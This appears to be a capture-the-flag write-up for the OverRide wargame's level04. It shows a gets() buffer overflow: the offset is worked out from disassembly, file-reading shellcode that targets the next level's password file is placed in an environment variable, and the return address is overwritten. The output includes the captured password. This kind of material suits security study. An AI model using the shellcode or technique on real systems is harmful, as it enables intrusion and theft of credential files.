# level04

The program uses `gets` function to read stdin without checking size.

## Step 1. Calculate offset to overwrite `eip`
```assembly
level04@OverRide:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble main" level04
Dump of assembler code for function main:
[...]
   0x080486cd <+5>:	and    esp,0xfffffff0
   0x080486d0 <+8>:	sub    esp,0xb0
[...]
   0x08048757 <+143>:	lea    eax,[esp+0x20]
   0x0804875b <+147>:	mov    DWORD PTR [esp],eax
   0x0804875e <+150>:	call   0x80484b0 <gets@plt>
```
According to the disassembly, offset is `0xb0 - 0x20 + 0x8(padding) + 0x4(ebp) = 0x9c(156)`.

## Step 2. Store the shellcode in the environment variable
```c
#include <stdio.h>

int main(void)
{
	printf("0x%08x\n", getenv("SHELLCODE"));
}
```
```
level04@OverRide:~$ export SHELLCODE=`perl -e 'print "\x90"x100 . "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"'`
level04@OverRide:~$ gcc -m32 /tmp/getenv.c -o /tmp/getenv
level04@OverRide:~$ /tmp/getenv
0xffffd845
```
We put the shellcode in the environment variable and get the address by running a little C program.

## Step 3. Build the payload
```
level04@OverRide:~$ perl -e 'print "A"x156 . pack("V", 0xffffd845)' | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
